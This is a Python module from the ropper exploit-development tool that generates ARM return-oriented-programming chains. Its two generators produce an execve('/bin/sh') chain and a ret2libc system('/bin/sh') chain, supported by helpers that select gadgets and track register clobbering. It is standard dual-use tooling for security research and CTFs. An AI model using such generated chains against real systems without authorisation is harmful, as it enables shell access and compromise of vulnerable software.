# coding=utf-8
# Copyright 2018 Sascha Schirra
#
# Redistribution and use in source and binary forms, with or without
# modification, are permitted provided that the following conditions are met:
#
# 1. Redistributions of source code must retain the above copyright notice, this
# list of conditions and the following disclaimer.
#
# 2. Redistributions in binary form must reproduce the above copyright notice,
# this list of conditions and the following disclaimer in the documentation
# and/or other materials provided with the distribution.
#
# 3. Neither the name of the copyright holder nor the names of its contributors
# may be used to endorse or promote products derived from this software without
# specific prior written permission.
#
# THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS" AND
# ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED
# WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE
# DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT HOLDER OR CONTRIBUTORS BE LIABLE
# FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL
# DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR
# SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER
# CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY,
# OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE
# OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
from ropper.gadget import Category, Gadget
from ropper.common.error import *
from ropper.common.utils import *
from ropper.rop import Ropper
from ropper.arch import ARM
from ropper.ropchain.ropchain import *
from ropper.loaders.loader import Type
from ropper.loaders.elf import ELF
from ropper.loaders.raw import Raw
import re
import sys

if sys.version_info.major == 2:
    range = xrange


_ARM_ALIASES = {'sb': 9, 'sl': 10, 'fp': 11, 'ip': 12, 'sp': 13, 'lr': 14, 'pc': 15}

# Matches a single-instruction pop-pc terminator.  The `dst` group captures
# the complete brace-delimited register list as text; the chain generator
# parses it into a sorted list of register names.
_POP_LAST_LINE_RE = re.compile(r'^(?:pop|ldm(?:ia|fd)? sp!,)\s*\{([^}]*\bpc)\}$')

# Mnemonics whose first arg is read (not written).  Used to exclude false
# positives from the conservative "register clobber" analysis.
_READS_FIRST_ARG = frozenset((
    'str', 'strb', 'strh', 'strd', 'strex', 'strexb', 'strexh',
    'stm', 'stmia', 'stmib', 'stmda', 'stmdb', 'stmfd', 'stmea', 'push',
    'cmp', 'cmn', 'tst', 'teq',
    'b', 'bl', 'blx', 'bx', 'svc', 'swi',
    'msr', 'nop', 'dmb', 'dsb', 'isb',
))

_FIRST_REG_RE = re.compile(
    r'^[a-z]+\s+\{?(r1[0-5]|r\d|sb|sl|fp|ip|sp|lr|pc)\b')

# Whitelist of mnemonics safe to appear before a gadget's terminal pop-pc.
# We exclude all forms of store (memory writes that could trash the chain
# itself), all branches, all svc/swi, all coprocessor ops, all conditionals,
# and anything that writes to sp/pc.  Everything in this set is unconditional
# and either pure-register or pure-load.
_SAFE_NONTERMINAL_MNEMS = frozenset((
    'mov', 'mvn', 'movs', 'mvns', 'mrs',
    'add', 'sub', 'rsb', 'adc', 'sbc', 'rsc',
    'adds', 'subs', 'rsbs', 'adcs', 'sbcs', 'rscs',
    'and', 'orr', 'eor', 'bic',
    'ands', 'orrs', 'eors', 'bics',
    'lsl', 'lsr', 'asr', 'ror', 'rrx',
    'lsls', 'lsrs', 'asrs', 'rors', 'rrxs',
    'mul', 'mla', 'mls', 'muls', 'mlas',
    'umull', 'smull', 'umlal', 'smlal',
    'cmp', 'cmn', 'tst', 'teq',
    'sxtb', 'sxth', 'uxtb', 'uxth', 'sxtab', 'sxtah', 'uxtab', 'uxtah',
    'rev', 'rev16', 'revsh', 'rbit', 'clz',
    'nop',
    'ldr', 'ldrb', 'ldrh',
))


def _isUsableChainGadget(gadget):
    """Return True if `gadget` is safe to chain.  A usable gadget:
        * ends in a clean pop-pc (terminator pop set must not include sp)
        * every non-terminal instruction's mnemonic is in the small safe-list
          (no memory writes, no branches, no svc, no conditionals, no sp/pc writes)
    """
    if not _popPcMatch(gadget):
        return False
    if 'sp' in _popPcRegs(gadget):
        return False  # mid-chain stack pivot
    for line in gadget.lines[:-1]:
        text, mnem = line[1], line[2]
        if mnem not in _SAFE_NONTERMINAL_MNEMS:
            return False
        m = _FIRST_REG_RE.match(text)
        if m and m.group(1) in ('sp', 'pc'):
            return False
    return True


def _reg_index(reg):
    """Canonical numeric index for an ARM register name.

    ARM's pop/ldm always loads registers in ascending numeric order regardless of
    how they're written in the assembly source, so this index is also the stack
    slot the register receives its value from.
    """
    if reg in _ARM_ALIASES:
        return _ARM_ALIASES[reg]
    if reg.startswith('r') and reg[1:].isdigit():
        return int(reg[1:])
    return -1


def _popPcMatch(gadget):
    if not gadget.lines:
        return None
    return _POP_LAST_LINE_RE.match(gadget.lines[-1][1])


def _popPcRegs(gadget):
    """Registers loaded by the gadget's terminal pop-pc, in stack-slot order."""
    m = _popPcMatch(gadget)
    if not m:
        return []
    regs = [r.strip() for r in m.group(1).split(',')]
    return sorted(regs, key=_reg_index)


def _clobberedRegs(gadget):
    """Conservative set of registers the gadget destroys.  Includes the
    terminal pop set plus any register that appears as the first (written)
    operand of an earlier instruction."""
    regs = _bodyClobberedRegs(gadget)
    regs.update(_popPcRegs(gadget))
    regs.discard('pc')
    return regs


def _bodyClobberedRegs(gadget):
    """Registers destroyed by gadget *body* instructions (not the terminal pop).
    These clobbers are unrecoverable — the body writes whatever value its
    semantics dictate, so we cannot supply the new value from the chain.
    A reg in this set, if already loaded with a target value, is lost."""
    regs = set()
    for line in gadget.lines[:-1]:
        text, mnem = line[1], line[2]
        if mnem in _READS_FIRST_ARG:
            continue
        m = _FIRST_REG_RE.match(text)
        if m:
            regs.add(m.group(1))
    return regs


class RopChainARM(RopChain):
    """Base class for ARM (32-bit, EABI) ROP-chain generators."""

    MAX_QUALI = 7

    @classmethod
    def name(cls):
        return ''

    @classmethod
    def availableGenerators(cls):
        return [RopChainARMExecve, RopChainARMSpawnShell]

    @classmethod
    def archs(cls):
        return [ARM]

    def _packFmt(self):
        return "'<I'"

    def _printHeader(self):
        toReturn = ''
        toReturn += ('#!/usr/bin/env python\n')
        toReturn += ('# Generated by ropper ropchain generator #\n')
        toReturn += ('from struct import pack\n')
        toReturn += ('\n')
        toReturn += ('p = lambda x : pack(%s, x)\n' % self._packFmt())
        toReturn += ('\n')
        return toReturn

    def _printRebase(self):
        toReturn = ''
        for binary, section in self._usedBinaries:
            imageBase = Gadget.IMAGE_BASES[binary]
            idx = self._usedBinaries.index((binary, section))
            toReturn += ('IMAGE_BASE_%d = %s # %s\n' % (idx, toHex(imageBase, 4), binary))
            toReturn += ('rebase_%d = lambda x : p(x + IMAGE_BASE_%d)\n\n' % (idx, idx))
        return toReturn

    def _printPaddingInstruction(self, addr='0xdeadbeef'):
        return ('rop += p(%s)\n' % addr)

    def _printRebasedAddress(self, addr, idx=0):
        return ('rop += rebase_%d(%s)\n' % (idx, addr))

    def _printAddString(self, string):
        return ("rop += '%s'\n" % string)

    def _parsePopSet(self, gadget):
        """Registers loaded by the gadget's terminal pop-pc, sorted by ARM
        encoding order (lowest reg first, pc last)."""
        return _popPcRegs(gadget)

    def _binaryIdx(self, gadget):
        return self._usedBinaries.index((gadget.fileName, gadget.section))

    def _printPopGadget(self, gadget, values):
        """Emit a `pop {regs, pc}` gadget header followed by one stack slot per
        popped register (except pc, which is consumed by the gadget itself).

        `values` is a {reg_name: emitted_line} dict.  Missing entries are
        filled with a default-padding slot.
        """
        idx = self._binaryIdx(gadget)
        toReturn = 'rop += rebase_%d(%s) # %s\n' % (
            idx, toHex(gadget.lines[0][0], 4), gadget.simpleString())
        for r in _popPcRegs(gadget):
            if r == 'pc':
                continue
            if values.get(r):
                toReturn += values[r]
            else:
                toReturn += self._printPaddingInstruction()
        return toReturn

    def _iterPopPcGadgets(self):
        """Yield every gadget whose terminal instruction is a clean pop-pc.
        Broader than Category.LOAD_REG (which only sees first-line matches)
        and catches gadgets like `mov r7, r4 ; pop {r4, pc}` that set extra
        registers through the body before dispatching via the pop.  Gadgets
        containing conditional execution, sp/pc writes outside the terminator,
        or stack pivots are skipped."""
        for binary in self._binaries:
            for g in self._gadgets[binary]:
                if _isUsableChainGadget(g):
                    yield g

    def _gadgetsByCategory(self, category):
        for binary in self._binaries:
            for g in self._gadgets[binary]:
                cat = g.category
                if cat and cat[0] == category:
                    yield g

    def _findPopGadget(self, required, dontModify=None):
        """Pick a pop-pc gadget whose popped-reg set covers `required` and
        whose conservative clobber set is disjoint from `dontModify`.
        Prefers the gadget with the fewest extra clobbered registers."""
        dontModify = set(dontModify or [])
        required = set(required)
        best, best_extra = None, None
        for g in self._iterPopPcGadgets():
            if self.containsBadbytes(g.address):
                continue
            popset = set(_popPcRegs(g))
            popset.discard('pc')
            if not required.issubset(popset):
                continue
            if _clobberedRegs(g) & dontModify:
                continue
            extra = len(popset - required)
            if best is None or extra < best_extra:
                best, best_extra = g, extra
        if best is not None:
            self._updateUsedBinaries(best)
        return best

    def _findSvc0(self):
        """Locate a `svc 0` gadget.  Prefer the SYSCALL category; fall back
        to a raw-opcode scan of executable sections."""
        for g in self._gadgetsByCategory(Category.SYSCALL):
            if self.containsBadbytes(g.address):
                continue
            self._updateUsedBinaries(g)
            return g
        try:
            return self._searchOpcode('000000ef')
        except RopChainError:
            return None

    def _searchOpcode(self, opcode):
        r = Ropper()
        gadgets = []
        for binary in self._binaries:
            gadgets.extend(r.searchOpcode(binary, opcode=opcode, disass=True))
        for g in gadgets:
            if not g:
                continue
            address = Gadget.IMAGE_BASES.get(g.fileName, 0) + g.lines[0][0]
            if not self.containsBadbytes(address):
                self._updateUsedBinaries(g)
                return g
        raise RopChainError('Cannot create gadget for opcode: %s' % opcode)

    def _writeCommandToDataSection(self, cmd, base_address):
        """Write `cmd` to a writable section via a `str rX, [rY]` gadget fed
        by a pop gadget that loads both src and dst.  Returns the chain
        fragment.  Raises RopChainError if no suitable gadgets exist."""
        write = None
        for g in self._gadgetsByCategory(Category.WRITE_MEM):
            if not self.containsBadbytes(g.address):
                write = g
                break
        if write is None:
            raise RopChainError('No str-mem gadget available')

        src_reg = write.category[2]['src']
        dst_reg = write.category[2]['dst']
        if src_reg == dst_reg:
            raise RopChainError('str gadget src == dst, unusable')

        # Prefer one pop gadget that covers both src and dst at once.
        pop = self._findPopGadget([src_reg, dst_reg])
        if pop is None:
            raise RopChainError('No pop gadget covers str src+dst')

        self._updateUsedBinaries(write)
        write_idx = self._binaryIdx(write)

        # ARM pop loads regs in ascending numeric order, so the user-supplied
        # mapping in `values` is keyed by reg name and _printPopGadget reorders.
        if len(cmd) % 4:
            cmd = cmd + ('\x00' * (4 - len(cmd) % 4))

        text = ''
        for off in range(0, len(cmd), 4):
            part = cmd[off:off + 4]
            values = {
                src_reg: self._printAddString(part),
                dst_reg: self._printRebasedAddress(toHex(base_address + off, 4), idx=write_idx),
            }
            text += self._printPopGadget(pop, values)
            text += 'rop += rebase_%d(%s) # %s\n' % (
                write_idx, toHex(write.lines[0][0], 4), write.simpleString())
        return text

    def _writeCmdToData(self, cmd, dataaddr):
        return self._writeCommandToDataSection(cmd, dataaddr)

    def create(self, options=None):
        pass


class RopChainARMExecve(RopChainARM):
    """Generate an execve('/bin/sh', NULL, NULL) chain for ARM Linux EABI.

    Target register state at `svc 0`:
        r0 = pointer to cmd string
        r1 = 0   (argv = NULL)
        r2 = 0   (envp = NULL)
        r7 = 11  (NR_execve)
    """

    @classmethod
    def usableTypes(cls):
        return (ELF, Raw)

    @classmethod
    def name(cls):
        return 'execve'

    def _loadRegisters(self, targets, cmd_address_str=None):
        """Emit the part of the chain that sets r0/r1/r2/r7.

        `targets` is {reg: int_value}.
        `cmd_address_str` (optional) is a pre-formatted source line for r0
        (e.g. a rebase_0(...) call).  When supplied it overrides the default
        padding-instruction for r0.
        """
        required = list(targets.keys())

        def values_for(popset_regs):
            vals = {}
            for reg in popset_regs:
                if reg not in targets:
                    continue
                if reg == 'r0' and cmd_address_str is not None:
                    vals[reg] = cmd_address_str
                else:
                    vals[reg] = self._printPaddingInstruction(toHex(targets[reg], 4))
            return vals

        # Plan A: a single pop gadget covers every required register.
        single = self._findPopGadget(required)
        if single is not None:
            return self._printPopGadget(single, values_for(_popPcRegs(single)))

        # Plan B: greedy multi-gadget cover that allows re-loading.
        #
        # Key insight: the constraint isn't "don't touch any already-loaded
        # register" - it's "don't lose the *value* of any already-loaded
        # target".  If a candidate gadget's terminal pop happens to include
        # a register we've already set, we simply re-supply the same target
        # value on the stack; the end state is unchanged.  Only *body*
        # instructions (the `mov r0, r4` inside `mov r0, r4 ; pop {r4, pc}`)
        # can destroy a value we cannot recover, so those are the only
        # clobbers we must reject.
        self._printMessage(
            'No single pop gadget covers {r0,r1,r2,r7}; using multi-gadget cover '
            '(re-loading already-set targets is allowed).')

        target_set = set(required)
        text = ''
        remaining = set(required)
        while remaining:
            loaded = target_set - remaining
            best, best_cov = None, set()
            for g in self._iterPopPcGadgets():
                if self.containsBadbytes(g.address):
                    continue
                # Body clobbers are unrecoverable - skip if any already-
                # loaded target would die.
                if _bodyClobberedRegs(g) & loaded:
                    continue
                popset = set(_popPcRegs(g))
                popset.discard('pc')
                cov = popset & remaining
                if len(cov) > len(best_cov):
                    best, best_cov = g, cov
            if not best:
                missing = ', '.join(sorted(remaining))
                self._printMessage(
                    'Cannot find pop gadget for: %s - emitting placeholder.' % missing)
                text += '# TODO: load %s manually - no pop gadget found that\n' % missing
                text += '#       covers them without body-clobbering loaded targets: %s\n' % (
                    ', '.join(sorted(loaded)) or '(none)')
                break
            self._updateUsedBinaries(best)
            # values_for() already re-supplies every popped reg that is in
            # `targets`, so previously-loaded targets keep their values.
            text += self._printPopGadget(best, values_for(_popPcRegs(best)))
            remaining -= best_cov
        return text

    def create(self, options=None):
        options = options or {}
        cmd = options.get('cmd') or '/bin/sh'
        address = options.get('address')

        if len(cmd.split(' ')) > 1:
            raise RopChainError('No argument support for execve commands')

        self._printMessage('ROPchain Generator for syscall execve on ARM (Linux EABI):')
        self._printMessage('\nload registers:')
        self._printMessage('  r0 = pointer to cmd string')
        self._printMessage('  r1 = 0   (argv = NULL)')
        self._printMessage('  r2 = 0   (envp = NULL)')
        self._printMessage('  r7 = 11  (NR_execve)')
        self._printMessage('then: svc 0')

        chain_body = '\n'
        cmd_address_str = None

        if address is None:
            # Try to write `cmd` into .data and use that address for r0.
            try:
                section = self._binaries[0].getSection('.data')
                cmdaddress = section.offset
                write_text = self._writeCommandToDataSection(cmd, cmdaddress)
                chain_body += write_text
                # The write path will have added the str gadget's binary to
                # _usedBinaries.  Its rebase idx is what we need to address
                # the freshly-written cmd buffer.
                for i, (fname, _sec) in enumerate(self._usedBinaries):
                    if fname == self._binaries[0].fileName:
                        cmd_address_str = self._printRebasedAddress(toHex(cmdaddress, 4), idx=i)
                        break
                cmd_addr_value = cmdaddress
            except RopChainError as e:
                self._printMessage('Cannot synthesize cmd-write gadget: %s' % e)
                self._printMessage('Using 0x41414141 as cmd address - please replace.')
                cmd_addr_value = 0x41414141
        else:
            cmd_addr_value = int(address, 16) if isinstance(address, str) else address

        targets = {'r0': cmd_addr_value, 'r1': 0, 'r2': 0, 'r7': 11}
        chain_body += self._loadRegisters(targets, cmd_address_str=cmd_address_str)

        # svc 0 terminator.
        svc = self._findSvc0()
        if svc is not None:
            idx = self._binaryIdx(svc)
            chain_body += 'rop += rebase_%d(%s) # %s\n' % (
                idx, toHex(svc.lines[0][0], 4), svc.simpleString())
        else:
            chain_body += '# INSERT SVC 0 GADGET HERE\n'
            self._printMessage('No svc 0 gadget found!')

        chain = self._printHeader()
        chain += self._printRebase()
        chain += "rop = ''\n"
        chain += chain_body
        chain += 'print(rop)\n'
        return chain


class RopChainARMSpawnShell(RopChainARM):
    """Generate a ret2libc ``system('/bin/sh')`` chain for ARM (AAPCS).

    The first argument is passed in ``r0``; control reaches ``system()`` via
    the ``pc`` slot of a terminal-pop dispatch gadget::

        [ pop {r0, .., pc} ]   (placeholder if no r0-popping gadget exists)
        [ &"/bin/sh"       ]   -> r0
        [ padding...       ]   -> any GP regs popped between r0 and pc
        [ &system          ]   -> loaded into pc => branches to system()

    ``&system`` and ``&"/bin/sh"`` are resolved by the shared base helpers
    (supplied address > in-binary symbol/write > placeholder)."""

    @classmethod
    def usableTypes(cls):
        return (ELF, Raw)

    @classmethod
    def name(cls):
        return 'spawn_shell'

    def create(self, options=None):
        options = options or {}
        cmd = options.get('cmd') or '/bin/sh'
        address = options.get('address')
        string = options.get('string')

        self._printMessage('ROPchain Generator for system() on ARM (ret2libc):')
        self._printMessage('  r0 = pointer to cmd string, then branch to system()')

        defs = ''
        body = '\n'

        binsh_line, binsh_defs, write_text = self._resolveBinshPointer(cmd, string)
        defs += binsh_defs
        body += write_text

        system_line, system_defs = self._resolveSystemAddress(address)
        defs += system_defs

        # pop {r0, .., pc}: r0 <- &"/bin/sh", pc <- system()
        pop = self._findPopGadget(['r0'])
        if pop is not None:
            body += self._printPopGadget(pop, {'r0': binsh_line})
            # The stack slot consumed by pc (after every popped GP register)
            # is whatever we emit next, so system() lands in pc.
            body += system_line
        else:
            self._printMessage('No `pop {r0, .., pc}` gadget found; emitting placeholder.')
            body += '# INSERT `pop {r0, pc}` GADGET HERE\n'
            body += binsh_line + '#   ^ value intended for r0\n'
            body += system_line + '#   ^ value intended for pc (system)\n'

        chain = self._printHeader()
        chain += self._printRebase()
        chain += defs
        chain += "rop = ''\n"
        chain += body
        chain += 'print(rop)\n'
        return chain
